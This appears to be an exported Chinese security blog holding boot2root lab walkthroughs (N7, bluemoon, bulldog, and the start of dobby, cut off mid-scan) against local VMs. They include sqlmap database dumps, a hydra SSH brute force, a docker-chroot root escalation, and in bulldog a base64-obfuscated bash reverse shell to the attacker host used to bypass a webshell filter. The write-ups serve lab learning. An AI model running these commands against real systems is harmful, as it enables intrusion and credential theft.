<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">POST http://192.168.1.236/enter_network/ HTTP/1.1</span><br><span class="line">Host: 192.168.1.236</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Origin: http://192.168.1.236</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.1.236/enter_network/</span><br><span class="line">Cookie: user=JGFyZ29uMmkkdj0xOSRtPTY1NTM2LHQ9NCxwPTEkZFhONFVtOUZXVkJDU0RWek9XaFRUQSRYUkFiWjJkK2poN0tVaUFqRlFKNVJ3Y3lXTFE5bStFTkwxUm85U3puUFpZ; role=MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%253D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user=admin&amp;pass=admin&amp;sub=SEND</span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt --dbs --batch</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">no output error</span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt --is-dba</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[18:48:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">root@localhost</span><br><span class="line">current user is DBA: True</span><br><span class="line">[18:53:11] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.236'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt --os-shell</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">no???</span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt --current-db --batch</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">current database: 'Machine'</span><br><span class="line"></span><br><span class="line">sqlmap -r 1.txt -D 'Machine' --batch --dump-all</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">1</span><br><span class="line">[19:02:07] [INFO] retrieved: </span><br><span class="line">[19:02:18] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">login</span><br><span class="line">[19:02:42] [INFO] fetching columns for table 'login' in database 'Machine'</span><br><span class="line">[19:02:42] [INFO] retrieved: 3</span><br><span class="line">[19:02:47] [INFO] retrieved: username</span><br><span class="line">[19:03:21] [INFO] retrieved: password</span><br><span class="line">[19:04:01] [INFO] retrieved: role</span><br><span class="line">[19:04:22] [INFO] fetching entries for table 'login' in database 'Machine'</span><br><span class="line">[19:04:22] [INFO] fetching number of entries for table 'login' in database 'Machine'</span><br><span class="line">[19:04:22] [INFO] retrieved: 1</span><br><span class="line">[19:04:24] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                               </span><br><span class="line">FLAG&#123;N7:KSA_01&#125;</span><br><span class="line">[19:05:48] [INFO] retrieved: admin</span><br><span class="line">[19:06:11] [INFO] retrieved: administrator</span><br><span class="line">Database: Machine</span><br><span class="line">Table: login</span><br><span class="line">[1 entry]</span><br><span class="line">+-------+-----------------+---------------+</span><br><span class="line">| role  | password        | username      |</span><br><span class="line">+-------+-----------------+---------------+</span><br><span class="line">| admin | FLAG&#123;N7:KSA_01&#125; | administrator |</span><br><span class="line">+-------+-----------------+---------------+</span><br></pre></td></tr></table></figure>

<p><img data-src="./Web-Machine-N7/6.png" alt></p>
<ul>
<li>作弊去后台看了下，貌似已经结束了拿到<code>FLAG{N7:KSA_01}</code>，离了大谱</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Web Machine</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Web Machine</tag>
      </tags>
  </entry>
  <entry>
    <title>bluemoon</title>
    <url>/2021/04/25/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/bluemoon/</url>
    <content><![CDATA[<h1 id="bluemoon"><a href="#bluemoon" class="headerlink" title="bluemoon"></a>bluemoon</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>bluemoon</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.23    08:00:27:80:0d:0e       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.23</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.4.23</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.4.23</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-25 07:52 EDT</span><br><span class="line">Nmap scan report for BlueMoon.lan (192.168.4.23)</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 2c:e2:63:78:bc:55:fe:f3:cb:09:a9:d8:26:2f:cb:d5 (RSA)</span><br><span class="line">|   256 c4:c8:6b:48:92:25:a5:f7:00:9f:ab:b2:56:d5:ed:dc (ECDSA)</span><br><span class="line">|_  256 a9:5b:39:a1:6e:05:91:0f:75:3c:88:0b:55:7c:a8:c2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: BlueMoon:2021</span><br><span class="line">MAC Address: 08:00:27:80:0D:0E (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/25%OT=21%CT=1%CU=30643%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=6085580C%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.31 ms BlueMoon.lan (192.168.4.23)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./bluemoon/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/bluemoon# gobuster dir -u http://192.168.4.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.23/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     txt,php,html</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 07:52:39 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/hidden_text (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 07:55:29 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./bluemoon/2.png" alt></p>
<p><a href="http://192.168.4.23/hidden_text" target="_blank" rel="noopener">http://192.168.4.23/hidden_text</a></p>
<p><img data-src="./bluemoon/3.png" alt></p>
<p><a href="http://192.168.4.23/.QR_C0d3.png" target="_blank" rel="noopener">http://192.168.4.23/.QR_C0d3.png</a></p>
<p><img data-src="./bluemoon/4.png" alt></p>
<h3 id="扫描二维码"><a href="#扫描二维码" class="headerlink" title="扫描二维码"></a>扫描二维码</h3><p><img data-src="./bluemoon/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">HOST=ip</span><br><span class="line">USER=userftp</span><br><span class="line">PASSWORD=ftpp@ssword</span><br><span class="line"></span><br><span class="line">ftp -inv $HOST user $USER $PASSWORD</span><br><span class="line">bye</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ul>
<li>发现账号密码 <code>userftp / ftpp@ssword</code></li>
</ul>
<p><img data-src="./bluemoon/6.png" alt></p>
<p>权限较大，可以查看众多文件</p>
<p><img data-src="./bluemoon/7.png" alt></p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p><img data-src="./bluemoon/8.png" alt></p>
<ul>
<li>提醒的很明显了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> user.txt</span></span><br><span class="line">jerry</span><br><span class="line">robin</span><br><span class="line">userftp</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> password.txt</span></span><br><span class="line">h4ck3rp455wd</span><br><span class="line">4dm1n</span><br><span class="line">Pr0h4ck3r</span><br><span class="line">5cr1ptk1dd3</span><br><span class="line">pubgpr0pl4yer</span><br><span class="line">H34d5h00t3r</span><br><span class="line">p@ssw0rd</span><br><span class="line">@@d1dn0tf1nd</span><br><span class="line">J4ck_5p4rr0w</span><br><span class="line">c4pt10n_jack</span><br><span class="line">D0veC4m3r0n</span><br><span class="line">f1nnb4l0r</span><br><span class="line">r0manr3ing5</span><br><span class="line">s3thr0lin5</span><br><span class="line">Demonk1ng</span><br><span class="line">R4ndy0rton</span><br><span class="line">Big_sh0w</span><br><span class="line">j0hnc3na</span><br><span class="line">5tr0ngp@ssw0rd</span><br><span class="line">S4br1n4</span><br><span class="line">4nnlyn</span><br><span class="line">C4rp3nt3r</span><br><span class="line">K0fiKing5t0n</span><br><span class="line">chNAMPIN</span><br><span class="line">Herr0lins</span><br><span class="line">G0palT0p3r</span><br><span class="line">Log3shDriv3r</span><br><span class="line">k4rv3ndh4nh4ck3r</span><br><span class="line">P0nmuGunth0n</span><br><span class="line">Shank3rD3v</span><br><span class="line">KishorMilkV4n</span><br><span class="line">S4th15hR4cer</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> shell</span></span><br><span class="line">hydra -L ./user.txt -P ./password.txt 192.168.4.23 -t 4 -V ssh</span><br></pre></td></tr></table></figure>

<p><img data-src="./bluemoon/9.png" alt></p>
<ul>
<li>获得账号密码 <code>robin / k4rv3ndh4nh4ck3r</code></li>
</ul>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p><img data-src="./bluemoon/10.png" alt></p>
<ul>
<li>水平越权到 <code>jerry</code></li>
</ul>
<p><img data-src="./bluemoon/11.png" alt></p>
<p><img data-src="./bluemoon/12.png" alt></p>
<ul>
<li>顺手说一下<code>flag</code>，目前拿到了两个</li>
</ul>
<p><img data-src="./bluemoon/13.png" alt></p>
<p><img data-src="./bluemoon/14.png" alt></p>
<ul>
<li>最后提权到 <code>root</code></li>
</ul>
<p><img data-src="./bluemoon/15.png" alt></p>
<p><img data-src="./bluemoon/16.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./bluemoon/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>bulldog</title>
    <url>/2020/12/06/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/bulldog/</url>
    <content><![CDATA[<h1 id="bulldog"><a href="#bulldog" class="headerlink" title="bulldog"></a>bulldog</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="0-基本环境"><a href="#0-基本环境" class="headerlink" title="0 基本环境"></a>0 基本环境</h3><ul>
<li>攻击机：kali2020 192.168.43.105</li>
<li>靶机：bulldog 192.168.43.2</li>
</ul>
<h3 id="1-发现目标主机"><a href="#1-发现目标主机" class="headerlink" title="1 发现目标主机"></a>1 发现目标主机</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.43.0/24</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">192.168.43.2    08:00:27:cc:72:94      1      60  PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<h3 id="2-NMAP扫描主机"><a href="#2-NMAP扫描主机" class="headerlink" title="2 NMAP扫描主机"></a>2 NMAP扫描主机</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 探测一下靶机信息</span></span><br><span class="line">nmap -O -p 1-65535 -T4 -A 192.168.43.2</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-06 04:30 EST</span><br><span class="line">Nmap scan report for 192.168.43.2</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">|_http-server-header: WSGIServer/0.1 Python/2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">|_http-server-header: WSGIServer/0.1 Python/2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">MAC Address: 08:00:27:CC:72:94 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.41 ms 192.168.43.2</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                             </span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.18 seconds</span><br></pre></td></tr></table></figure>

<h3 id="3-开始访问开放的端口"><a href="#3-开始访问开放的端口" class="headerlink" title="3 开始访问开放的端口"></a>3 开始访问开放的端口</h3><p>访问 80 8080查看源码 未发现任何东西</p>
<p><img data-src="./bulldog/1.png" alt></p>
<h3 id="4-其它目录"><a href="#4-其它目录" class="headerlink" title="4 其它目录"></a>4 其它目录</h3><p><img data-src="./bulldog/2.png" alt></p>
<ul>
<li>admin 页面</li>
</ul>
<p><img data-src="./bulldog/3.png" alt></p>
<p>右键查看源代码未发现特殊</p>
<ul>
<li>dev 页面</li>
</ul>
<p><img data-src="./bulldog/4.png" alt></p>
<p>这里说的就是 之前网站被日了，然后换了新的团队和系统架构</p>
<p>右键源代码: 发现</p>
<p><img data-src="./bulldog/5.png" alt></p>
<p>整理下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Team Lead:         alan@bulldogindustries.com      6515229daf8dbdc8b89fed2e60f107433da5f2cb  -- 未查到</span><br><span class="line">Back-up Team Lead: william@bulldogindustries.com   38882f3b81f8f2bc47d9f3119155b05f954892fb  -- 未查到</span><br><span class="line">Front End:         malik@bulldogindustries.com     c6f7e34d5d08ba4a40dd5627508ccb55b425e279	 -- 未查到	</span><br><span class="line">Front End:         kevin@bulldogindustries.com     0e6ae9fe8af1cd4192865ac97ebf6bda414218a9	 -- 未查到	</span><br><span class="line">Back End:          ashley@bulldogindustries.com    553d917a396414ab99785694afd51df3a8a8a3e0	 -- 未查到</span><br><span class="line">Back End:          nick@bulldogindustries.com      ddf45997a7e18a25ad5f5cf222da64814dd060d5  -- bulldog</span><br><span class="line">Database:          sarah@bulldogindustries.com     d8b8dd5e7f000b8dea26ef8428caf38c04466b3e  -- bulldoglover</span><br></pre></td></tr></table></figure>



<h3 id="5-登录页面进入"><a href="#5-登录页面进入" class="headerlink" title="5 登录页面进入"></a>5 登录页面进入</h3><p><img data-src="./bulldog/6.png" alt></p>
<p><img data-src="./bulldog/7.png" alt></p>
<p>貌似没什么权限</p>
<p>备注: 尝试越权修改密码失败</p>
<h3 id="6-shell页面"><a href="#6-shell页面" class="headerlink" title="6 shell页面"></a>6 shell页面</h3><ul>
<li>回头查看，这里有一个 webshell界面</li>
</ul>
<p><img data-src="./bulldog/8.png" alt></p>
<p><img data-src="./bulldog/9.png" alt></p>
<p>这里可以使用一定的命令</p>
<ul>
<li>发现这个webshell 白名单做的几乎是随便绕</li>
</ul>
<p><img data-src="./bulldog/10.png" alt></p>
<p><img data-src="./bulldog/11.png" alt></p>
<h3 id="7-反弹shell"><a href="#7-反弹shell" class="headerlink" title="7 反弹shell"></a>7 反弹shell</h3><ul>
<li><code>bash -i &gt;&amp; /dev/tcp/192.168.43.105/2333 0&gt;&amp;1</code> 不知道为啥弹不出</li>
<li>换一个方式</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.43.105/2333 0&gt;&amp;1  base64 -&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjEwNS8yMzMzIDA+JjE=</span><br><span class="line">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjEwNS8yMzMzIDA+JjE= | base64 -d | bash</span><br></pre></td></tr></table></figure>

<p><img data-src="./bulldog/12.png" alt></p>
<p>弹出来了…</p>
<h3 id="8-提权-amp-amp-flag"><a href="#8-提权-amp-amp-flag" class="headerlink" title="8 提权&amp;&amp;flag"></a>8 提权&amp;&amp;flag</h3><p>发现这个用户比较值得搞一下</p>
<p><img data-src="./bulldog/13.png" alt></p>
<p><img data-src="./bulldog/14.png" alt></p>
<p>说的就是开发了一个很牛逼的东西，黑客是无法破解的，但是处于正在开发中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings customPermissionApp</span><br></pre></td></tr></table></figure>

<p><img data-src="./bulldog/15.png" alt></p>
<p>密码是 <code>SUPERultimatePASSWORDyouCANTget</code></p>
<p><img data-src="./bulldog/16.png" alt></p>
<p>貌似在容器内运行，出现这种情况, 尝试</p>
<p><img data-src="./bulldog/17.png" alt></p>
<p><img data-src="./bulldog/18.png" alt></p>
<h3 id="9-写在最后"><a href="#9-写在最后" class="headerlink" title="9 写在最后"></a>9 写在最后</h3><ul>
<li>最后一步也可以用<code>python</code>跑一个<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "import pty; pty.spawn('/bin/bash')" &gt; temp_shell.py</span><br><span class="line">python temp_shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> or </span></span><br><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./bulldog/19.png" alt></p>
<ul>
<li>反弹shell,也可以通过 <code>wget</code> 获取攻击者<code>python</code>脚本，从而反弹<code>shell</code></li>
<li>有一个<code>shell</code>失败的原因</li>
</ul>
<p><img data-src="./bulldog/20.png" alt></p>
<p><img data-src="./bulldog/21.png" alt></p>
<p><img data-src="./bulldog/22.png" alt></p>
<p><img data-src="./bulldog/23.png" alt></p>
<ul>
<li>条条大路拿<code>flag</code> + 自己太菜了</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>dobby</title>
    <url>/2021/06/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/dobby/</url>
    <content><![CDATA[<h1 id="dobby"><a href="#dobby" class="headerlink" title="dobby"></a>dobby</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>dobby</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/dobby# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    42:bc:b8:53:66:d8 (Unknown: locally administered)</span><br><span class="line">192.168.43.151  08:00:27:d7:99:f8 PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3 Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.151</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.151</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/dobby# nmap -sC -sV -p- 192.168.43.151</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 23:36 EDT</span><br><span class="line">Nmap scan report for 192.168.43.151</span><br><span class="line">Host is up (0.0073s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==</span><br><span class="line">MAC Address: 08:00:27:D7:99:F8 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./dobby/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.151/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi# gobuster dir -u http://192.168.43.151/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.151/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/06/12 23:36:48 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10977]</span><br><span 